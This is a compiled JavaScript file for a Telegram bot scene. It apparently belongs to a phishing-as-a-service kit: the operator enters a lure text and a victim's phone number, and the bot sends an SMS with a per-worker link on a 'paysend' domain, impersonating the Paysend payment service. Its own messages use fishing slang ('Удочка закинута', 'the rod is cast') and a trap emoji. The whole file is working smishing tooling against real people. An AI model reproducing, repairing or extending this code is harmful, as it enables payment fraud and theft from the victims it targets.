"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const sms_1 = require("../../../utils/rassilka/sms");
const console_1 = __importDefault(require("console"));
const getDomen_1 = require("../../../helpers/getDomen");
exports.scene = new grammy_scenes_1.Scene('smsSendPaysend');
exports.composer = new grammy_1.Composer();
const regex = /sms ad paysend/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    await ctx.scenes.enter('smsSendPaysend', {});
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel smsSendPaysend', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.smsEmail = { ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined };
    ctx.session.deleteMessage = [];
    const msg = await ctx.reply("<b>🪤 Введи письмо для смс:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel smsSendPaysend')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.pattern = ctx.msg.text;
    const msg = await ctx.reply("<b>📱 Введи номер (без +):</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel smsSendPaysend')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.to = ctx.msg.text;
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    const domen = await (0, getDomen_1.getDomen)(ctx.user, 'paysend');
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply(`⏳`);
    const response = await (0, sms_1.sendSmsPaysend)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who, `https://${domen.link}/link/paysend/${ctx.user.id}`, ctx.from.id);
    try {
        ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    console_1.default.log(response);
    await ctx.reply((response?.status === "true")
        ? `✅ Удочка закинута`
        : `⚠️ Не удалось отправить смс`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
    return cancel(ctx);
});
